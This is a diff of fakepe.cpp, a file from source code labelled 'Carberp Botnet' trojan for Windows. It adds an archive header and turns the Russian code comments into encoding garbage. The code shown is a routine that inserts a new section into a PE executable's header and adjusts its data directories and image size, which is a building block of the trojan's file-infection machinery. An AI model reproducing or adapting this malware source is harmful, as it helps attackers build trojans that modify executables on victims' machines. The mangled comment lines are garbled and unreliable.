@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // fakepe.cpp : Defines the entry point for the console application.
 //
 
@@ -69,7 +80,7 @@ DWORD PEFile::VAToOffset (PVOID Image,DWORD VA,BOOL IsMapped,BOOL Align)
 };
 
 //
-//	Добавляет секцию в РЕ заголовок.
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 PIMAGE_SECTION_HEADER PEFile::InsertSection (PVOID Image,PIMAGE_SECTION_HEADER psec)
 {
@@ -86,7 +97,7 @@ PIMAGE_SECTION_HEADER PEFile::InsertSection (PVOID Image,PIMAGE_SECTION_HEADER p
 	DataInHeader = BeginAreaNewSec = (DWORD)pNewSection  - (DWORD)Image;  
 
 //
-//		Поиск ссылок в 	DataDirectory которые ссылаются на данные в заголовке.
+//		пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 	DataDirectory пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 	for ( DWORD i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i)
 		if (   ( ( BeginAreaNewSec <= DataDirectory[i].VirtualAddress ) &			\
@@ -99,13 +110,13 @@ PIMAGE_SECTION_HEADER PEFile::InsertSection (PVOID Image,PIMAGE_SECTION_HEADER p
 	};
 
 //
-//		Проверка хватит ли местa в заголовке для новой секции.
+//		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅa пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 	if ( (pHeader->OptionalHeader.SizeOfHeaders - DataInHeader) < sizeof(IMAGE_SECTION_HEADER) )
 		return NULL;
 
 //
-//		фикс ссылок в  DataDirectory.    
+//		пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ  DataDirectory.    
 //		
 	if ( DataInHeader != BeginAreaNewSec )
 	{
@@ -125,7 +136,7 @@ PIMAGE_SECTION_HEADER PEFile::InsertSection (PVOID Image,PIMAGE_SECTION_HEADER p
 	};
 
 //
-//     Запись секции в РЕ заголовок, правка количества секций в образе.
+//     пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 	 m_memcpy(pNewSection,psec,sizeof(IMAGE_SECTION_HEADER));
 	 pHeader->OptionalHeader.SizeOfImage += ALIGN_UP(psec->Misc.VirtualSize,pHeader->OptionalHeader.SectionAlignment);
